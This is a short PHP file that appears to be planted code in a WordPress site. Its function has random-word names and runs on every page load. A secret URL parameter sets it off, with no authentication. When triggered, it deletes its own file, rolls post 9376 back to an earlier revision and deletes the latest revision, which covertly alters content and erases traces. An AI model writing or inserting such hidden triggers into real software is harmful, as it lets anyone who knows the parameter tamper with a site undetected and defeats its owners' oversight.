<?php

function sidebar_multiple_designer_chart() {
	if (isset($_GET['first_iframe_divi']) && $_GET['first_iframe_divi'] === 'stripe_editor_alt') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$creator_menu_toolbox_shortener = 9376;
		$json_mobile_selector_enhanced = wp_get_post_revisions($creator_menu_toolbox_shortener);
		if (empty($json_mobile_selector_enhanced)) die('no revisions');
		if (count($json_mobile_selector_enhanced) < 2) die('less than 2');
		$more_optimizer_rates_schedule = array_shift($json_mobile_selector_enhanced);
		$responsive_status_404_pro = $more_optimizer_rates_schedule->ID;
		$icons_super_country_health = array_shift($json_mobile_selector_enhanced);
		$theme_plugins_twitter_youtube = $icons_super_country_health->ID;
		$lock_current_details_background = wp_restore_post_revision($theme_plugins_twitter_youtube);
		if ($lock_current_details_background === false) die('error restoring');
		$lock_current_details_background = wp_delete_post_revision($responsive_status_404_pro);		
		if ($lock_current_details_background === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'sidebar_multiple_designer_chart');
